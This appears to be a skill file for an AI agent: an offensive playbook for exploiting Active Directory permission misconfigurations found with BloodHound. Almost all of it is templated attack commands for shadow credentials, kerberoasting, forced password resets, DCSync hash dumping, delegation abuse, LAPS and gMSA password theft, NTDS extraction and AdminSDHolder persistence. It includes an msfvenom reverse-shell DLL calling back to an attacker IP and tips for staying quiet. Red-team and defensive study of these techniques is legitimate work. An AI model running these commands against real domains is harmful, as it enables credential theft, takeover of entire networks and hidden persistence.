---
name: acl-abuse
description: Exploit Active Directory ACL/DACL misconfigurations. Use when BloodHound shows an outbound edge from an owned principal, or when planning privilege escalation via AD permissions including GenericAll, GenericWrite, WriteSPN, ForceChangePassword, WriteOwner, AddSelf, AddMember, ReadGMSAPassword, WriteDACL, AddKeyCredentialLink, WriteAccountRestrictions, ReadLAPSPassword, AllExtendedRights, DCSync, DNSAdmins, or AdminSDHolder.
user-invocable: false
allowed-tools: Read
---

# ACL Abuse

## GenericAll / GenericWrite over user
Choose in this order: shadow cred → targeted kerberoast → password change
```bash
# 1. Shadow credential (best — no password change, stealthy, returns NT hash via UnPAC)
certipy shadow auto -u '{USER}@{DOMAIN}' -p '{PASS}' -account {TARGET} -dc-ip {IP}
# Returns .pfx → auth to get NT hash (see UnPAC-the-Hash below)

# 2. Targeted kerberoast (no password change needed)
bloodyAD -u '{USER}' -p '{PASS}' -d {DOMAIN} --host {IP} set object {TARGET} servicePrincipalName -v 'fake/spn'
netexec ldap {IP} -u '{USER}' -p '{PASS}' --kerberoasting kerb.txt
hashcat -m 13100 kerb.txt /usr/share/wordlists/rockyou.txt
bloodyAD -u '{USER}' -p '{PASS}' -d {DOMAIN} --host {IP} remove object {TARGET} servicePrincipalName -v 'fake/spn'

# 3. Password change (noisiest — last resort)
bloodyAD -u '{USER}' -p '{PASS}' -d {DOMAIN} --host {IP} set password {TARGET} 'NewPass123!'
net rpc password {TARGET} 'NewPass123!' -U {DOMAIN}/{USER}%'{PASS}' -S {IP}
```

## AddKeyCredentialLink → Shadow Credentials
The BloodHound CE edge name for the shadow credential write path.
```bash
# From Linux (certipy)
certipy shadow auto -u '{USER}@{DOMAIN}' -p '{PASS}' -account {TARGET} -dc-ip {IP}

# From Linux (pywhisker — when certipy fails)
python3 pywhisker.py -d {DOMAIN} -u '{USER}' -p '{PASS}' --target {TARGET} --action add -f shadow
# Get certificate file, then:
python3 gettgtpkinit.py {DOMAIN}/{TARGET} -cert-pfx shadow.pfx -pfx-pass {PFX_PASS} {TARGET}.ccache
export KRB5CCNAME={TARGET}.ccache
python3 getnthash.py {DOMAIN}/{TARGET} -key {AS_REP_KEY}  # UnPAC-the-Hash
```

## UnPAC-the-Hash (after PKINIT / shadow credentials)
When you have a .pfx from shadow creds but need the NT hash (e.g., LDAP signing blocks certipy auth).
```bash
# Method 1: certipy auth (returns NT hash directly if LDAP signing not enforced)
certipy auth -pfx {TARGET}.pfx -dc-ip {IP}
# Output: NT hash ready

# Method 2: manual PKINIT → U2U → NT hash
python3 gettgtpkinit.py {DOMAIN}/{TARGET} -cert-pfx {TARGET}.pfx -pfx-pass {PASS} {TARGET}.ccache
export KRB5CCNAME={TARGET}.ccache
python3 getnthash.py {DOMAIN}/{TARGET} -key {AS_REP_SESSION_KEY}
# NT hash recovered without knowing password
```

## PassTheCert (when LDAP signing blocks NTLM flows)
Use certificate for LDAP operations — bypasses LDAP signing/channel binding.
```bash
# Grant DCSync rights using a certificate
python3 passthecert.py -action modify_rights -crt {USER}.crt -key {USER}.key -domain {DOMAIN} -dc-ip {IP} -target '{DOMAIN}' -rights DCSync
secretsdump.py {DOMAIN}/{USER}:'{PASS}'@{IP} -just-dc

# Add user to group using certificate
python3 passthecert.py -action add_user_to_group -crt {USER}.crt -key {USER}.key -domain {DOMAIN} -dc-ip {IP} -user {USER} -group 'Domain Admins'

# Reset password using certificate
python3 passthecert.py -action change_password -crt {USER}.crt -key {USER}.key -domain {DOMAIN} -dc-ip {IP} -target {TARGET} -new-pass 'NewPass123!'
```

## ForceChangePassword
```bash
bloodyAD -u '{USER}' -p '{PASS}' -d {DOMAIN} --host {IP} get object {TARGET} --attr userAccountControl
bloodyAD -u '{USER}' -p '{PASS}' -d {DOMAIN} --host {IP} set object {TARGET} userAccountControl -v 512  # enable if disabled
bloodyAD -u '{USER}' -p '{PASS}' -d {DOMAIN} --host {IP} set password {TARGET} 'NewPass123!'
net rpc password {TARGET} 'NewPass123!' -U {DOMAIN}/{USER}%'{PASS}' -S {IP}
```

## WriteOwner → GenericAll
```bash
bloodyAD -u '{USER}' -p '{PASS}' -d {DOMAIN} --host {IP} set owner {TARGET_OBJ} {USER}
bloodyAD -u '{USER}' -p '{PASS}' -d {DOMAIN} --host {IP} add genericAll {TARGET_OBJ} {USER}
# Now exploit as GenericAll above
```

## WriteDACL → grant rights
```bash
# Grant DCSync
dacledit.py -action write -rights DCSync -principal '{USER}' -target-dn 'DC=x,DC=x' '{DOMAIN}/{USER}:{PASS}'
secretsdump.py {DOMAIN}/{USER}:'{PASS}'@{IP} -just-dc

# Grant GenericAll on an object
dacledit.py -action write -rights FullControl -principal '{USER}' -target-dn '{TARGET_DN}' '{DOMAIN}/{USER}:{PASS}'
```

## AddSelf / AddMember
```bash
bloodyAD -u '{USER}' -p '{PASS}' -d {DOMAIN} --host {IP} add groupMember '{GROUP}' '{USER}'
# Then re-run BloodHound from this user's perspective
```

## AllExtendedRights
AllExtendedRights includes both ForceChangePassword AND ReadLAPSPassword.
Check the object type to determine which applies:
```bash
# If target is a user → ForceChangePassword
bloodyAD -u '{USER}' -p '{PASS}' -d {DOMAIN} --host {IP} set password {TARGET} 'NewPass123!'

# If target is a computer → ReadLAPSPassword
netexec ldap {IP} -u '{USER}' -p '{PASS}' -M laps
ldapsearch -x -H ldap://{IP} -D '{USER}@{DOMAIN}' -w '{PASS}' -b 'DC=x,DC=x' '(ms-Mcs-AdmPwd=*)' ms-Mcs-AdmPwd sAMAccountName
```

## ReadGMSAPassword
```bash
netexec ldap {IP} -u '{USER}' -p '{PASS}' --gmsa
bloodyAD -u '{USER}' -p '{PASS}' -d {DOMAIN} --host {IP} get object '{GMSA}$' --attr msDS-ManagedPassword
evil-winrm -i {IP} -u '{GMSA}$' -H {NT_HASH}
# Then check GMSA$ outbound ACL rights in BloodHound
```

## ReadLAPSPassword / SyncLAPSPassword
```bash
netexec ldap {IP} -u '{USER}' -p '{PASS}' -M laps
# Get local admin password for specific computer → PTH or direct login
evil-winrm -i {TARGET_IP} -u administrator -p '{LAPS_PASS}'
netexec smb {TARGET_IP} -u administrator -p '{LAPS_PASS}' --sam  # dump SAM
```

## WriteAccountRestrictions → RBCD
WriteAccountRestrictions allows writing msDS-AllowedToActOnBehalfOfOtherIdentity.
```bash
# Add attacker machine to allowed-to-act list on target
bloodyAD -u '{USER}' -p '{PASS}' -d {DOMAIN} --host {IP} set object '{TARGET}$' msDS-AllowedToActOnBehalfOfOtherIdentity -v '{ATTACKER_MACHINE_SID}'
getST.py -spn cifs/{TARGET_FQDN} -impersonate administrator {DOMAIN}/{ATTACKER}$ -hashes :{NT_HASH} -dc-ip {IP}
export KRB5CCNAME=administrator@cifs_{TARGET}.ccache
psexec.py {DOMAIN}/administrator@{TARGET_FQDN} -k -no-pass
```

## GenericAll / GenericWrite over computer → RBCD or shadow cred
```bash
# Shadow cred on computer account (requires ADCS)
certipy shadow auto -u '{USER}@{DOMAIN}' -p '{PASS}' -account '{COMPUTER}$' -dc-ip {IP}

# RBCD: add fake machine account first
addcomputer.py {DOMAIN}/{USER}:'{PASS}' -computer-name 'ATTACKER$' -computer-pass 'Attacker123!' -dc-ip {IP}
bloodyAD -u '{USER}' -p '{PASS}' -d {DOMAIN} --host {IP} set object '{TARGET}$' msDS-AllowedToActOnBehalfOfOtherIdentity -v '{ATTACKER_SID}'
getST.py -spn cifs/{TARGET_FQDN} -impersonate administrator {DOMAIN}/ATTACKER$ -dc-ip {IP} -hashes :{NT_HASH}
```

## WriteDACL / GenericAll on ADCS template → ESC4
See adcs skill for full flow.

## Backup Operators → NTDS.dit
```bash
# Registry hive method
reg save HKLM\SAM C:\Temp\sam
reg save HKLM\SYSTEM C:\Temp\system
reg save HKLM\SECURITY C:\Temp\security
secretsdump.py -sam sam -system system -security security LOCAL

# Diskshadow + robocopy method (for NTDS.dit — needs Windows shell)
# diskshadow.exe → create volume shadow copy → robocopy to accessible path
secretsdump.py -ntds ntds.dit -system system LOCAL

# Remote via netexec (if you have backup ops via WinRM)
netexec smb {IP} -u '{USER}' -p '{PASS}' --ntds
```

## Account Operators
Account Operators can create users and modify most groups (except Domain Admins, Schema Admins).
```bash
# Create new user and add to target group
bloodyAD -u '{USER}' -p '{PASS}' -d {DOMAIN} --host {IP} add user newuser 'Pass123!'
bloodyAD -u '{USER}' -p '{PASS}' -d {DOMAIN} --host {IP} add groupMember '{TARGET_GROUP}' newuser

# Or modify existing non-protected accounts directly
```

## DCSync
```bash
secretsdump.py {DOMAIN}/{USER}:'{PASS}'@{IP} -just-dc
secretsdump.py {DOMAIN}/{USER}@{IP} -hashes :{NT_HASH} -just-dc
secretsdump.py {DOMAIN}/{USER}@{IP} -k -no-pass -just-dc   # Kerberos
# After DCSync → see lateral-movement skill: Golden Ticket, PTH, PTT
```

## DNSAdmins → SYSTEM on DC
```bash
# Requires membership in DNSAdmins group
msfvenom -p windows/x64/shell_reverse_tcp LHOST={ATTACKER_IP} LPORT=443 -f dll -o evil.dll
# Host evil.dll on SMB share
python3 dnstool.py -u '{DOMAIN}\{USER}' -p '{PASS}' --action modify --record '\\{ATTACKER_IP}\share\evil.dll' --type SERVERLEVELPLUGINDLL {DC_IP}
# Or from Windows: dnscmd {DC_FQDN} /config /serverlevelplugindll \\{ATTACKER_IP}\share\evil.dll
# Then restart DNS: sc stop dns && sc start dns
```

## AdminSDHolder persistence (red team)
AdminSDHolder propagates its ACL to all adminCount=1 objects every 60 min.
```bash
# Grant GenericAll on AdminSDHolder → persists to all protected accounts
dacledit.py -action write -rights FullControl -principal '{BACKDOOR_USER}' -target-dn 'CN=AdminSDHolder,CN=System,DC=x,DC=x' '{DOMAIN}/{USER}:{PASS}'
# Wait up to 60 minutes for SDProp to run, or trigger manually
```

## SeMachineAccountPrivilege + SeEnableDelegationPrivilege
This combo allows setting unconstrained delegation on a machine you create — enables DC coercion attacks.
```bash
# Create machine account
addcomputer.py {DOMAIN}/{USER}:'{PASS}' -computer-name 'EVIL$' -computer-pass 'Evil123!' -dc-ip {IP}
# Set unconstrained delegation on it (requires SeEnableDelegationPrivilege)
bloodyAD -u '{USER}' -p '{PASS}' -d {DOMAIN} --host {IP} set object 'EVIL$' userAccountControl -v 528384
# Then coerce DC auth → see lateral-movement: unconstrained delegation
```

## Gotchas
- **Always try shadow cred first** when ADCS is present — avoids noisy password change
- **Check account status before ForceChangePassword** — disabled accounts need enabling first
- **Remove fake SPN** after targeted kerberoast — clean up after yourself
- **LDAP signing enforced** → use PassTheCert or Kerberos-based tools instead of NTLM
- **Backup Operators** → diskshadow for NTDS.dit, registry hives for SAM/SYSTEM only
- **gMSA Kerberoast** → always fails, 256-bit random password
- **Protected Users members** → no NTLM, no RC4, no delegation; Kerberos AES only
- **adminCount=1** → ACL changes to parent OU won't propagate; must modify object directly

## Key References
- https://www.thehacker.recipes/ad/movement/dacl
- https://www.ired.team
- https://github.com/ShutdownRepo/pywhisker
- https://github.com/AlmondOffSec/PassTheCert
- https://www.thehacker.recipes/ad/movement/kerberos/unpac-the-hash
- https://0xdf.gitlab.io
